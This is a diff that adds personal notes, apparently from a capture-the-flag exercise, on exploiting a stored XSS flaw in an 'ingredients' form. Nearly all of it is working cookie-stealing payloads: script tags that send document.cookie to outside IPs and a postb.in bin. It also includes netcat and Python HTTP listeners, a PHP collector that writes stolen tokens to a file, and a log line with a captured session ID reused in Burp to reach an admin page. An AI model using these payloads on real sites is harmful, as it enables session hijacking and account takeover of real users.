@@ -1,0 +1,88 @@
+<script>alert("XSS!")</script>
+# executes when we submit the ingredintes and ask the cookie monster to view them...
+
+# insert that into the ingredients and there is a XSS vuln..
+
+<script>new Image().src="http://10.0.254.20/bogus.php?output="+document.cookie;</script>
+<script>new Image().src="http://172.17.0.1/bogus.php?output="+document.cookie;</scri$
+<script>new Image().src="http://10.0.2.15/bogus.php?output="+document.cookie;</script>
+<script>new Image().src="http://10.0.2.15:8000/bogus.php?output="+document.cookie;</script>
+#from PWK but none of them work 
+
+
+<script>document.write('cookie: ' + document.cookie)</script>
+nc -nlvp 80
+# doc write doesnt work
+
+
+# try 174.56.227.170
+# from https://postb.in/ show what the IP is 
+
+<script>alert(document.cookie);var i=new Image;i.src="http://174.56.227.170:8888/?"+document.cookie;</script>
+
+# nope 
+#ACI shell:
+<script>alert(document.cookie);var i=new Image;i.src="http://10.0.254.20:8888/?"+document.cookie;</script>
+
+#nope maybe itis the IP? back to the basics 
+
+
+#on the shell server
+python -m SimpleHTTPServer 12345
+
+<script>image = new Image();image.src='http://160.1.153.245:12345/?'+document.cookie;</script>
+#still no go 
+
+#try alert to see if it works first
+
+<script>alert("XSS!");var i=new Image;i.src="http://160.1.153.245:12345/?"+document.cookie;</script>
+<script>alert("XSS!");var i=new Image;i.src="http://160.1.153.245:12345/bogus.php?"+document.cookie;</script>
+
+# nope lets try the pwk one again 
+
+<script>new Image().src="http://160.1.153.245:12345/bogus.php?output="+document.cookie;</script>
+# nope 
+
+# try a simpler one 
+
+<script>alert(document.cookie)</script>
+
+7569d63a-4dac-4d84-8f96-ae3520c882b8
+
+7569d63a-4dac-4d84-8f96-ae3520c882b8
+
+# not the right cookie....
+
+# try to callback to postbin
+
+#start on saci shell
+python -m SimpleHTTPServer 12345
+
+# now load this on shell server as maliscuos.php
+
+$fp = fopen("/home/An0nym0us3/tokens.txt", "w");
+fwrite($fp, $_GET['code']);
+fclose($fp); 
+
+
+# inject this to run (took a few tries)
+
+<script>new Image().src='http://160.1.153.245:12345/malicious.php?code='%2Bdocument.cookie</script>
+
+160.1.153.245 - - [01/May/2020 11:30:19] "GET /malicious.php?code=session=9486b3d2-fa13-492e-ba93-8455df98d45a HTTP/1.1" 200 -
+
+
+
+# now when navigating to the admin page , use this session ID in burp 
+
+
+# new 
+
+<script>new Image().src='https://postb.in/1589765685538-7717803197447/malicious.php?code='%2Bdocument.cookie</script>
+
+
+<script>new Image().src='http://160.1.153.245:12345/malware.php?code='%2Bdocument.cookie</script>
+
+
+#not working
+<script>document.location='https://postb.in/1589728277442-1070735296234/bogus.php'?%2bdocument.cookie;<script/>
